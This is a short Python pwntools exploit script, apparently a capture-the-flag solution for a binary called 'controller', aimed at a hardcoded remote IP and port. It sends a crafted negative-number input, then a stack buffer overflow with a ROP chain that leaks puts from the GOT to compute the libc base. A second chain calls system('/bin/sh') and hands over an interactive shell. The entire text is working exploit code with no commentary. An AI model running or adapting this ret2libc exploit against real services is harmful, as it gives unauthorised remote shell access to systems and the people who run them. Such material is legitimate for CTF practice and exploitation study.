from pwn import *
from time import sleep


p = remote("139.59.190.72", 30736)

#p = process("./controller")
elf = ELF("controller")
libc = ELF("libc.so.6")

p.sendlineafter(": ", "0 -4295032634")
p.sendlineafter("> ", "2")
sleep(1)

pop_rdi = 0x00000000004011d3

payload = b"A"*40
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])

p.sendlineafter("> ", payload)
p.recvuntil("d\n")
libc.address = u64(p.recv(6).ljust(8, b"\x00")) - libc.symbols['puts']
log.info(f"LIBC:   {hex(libc.address)}")

p.sendlineafter(": ", "0 -4295032634")
p.sendlineafter("> ", "2")
sleep(1)

payload = b"A"*40
payload += p64(0x0000000000400606)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(libc.symbols['system'])

pause()
p.sendlineafter("> ", payload)
p.interactive()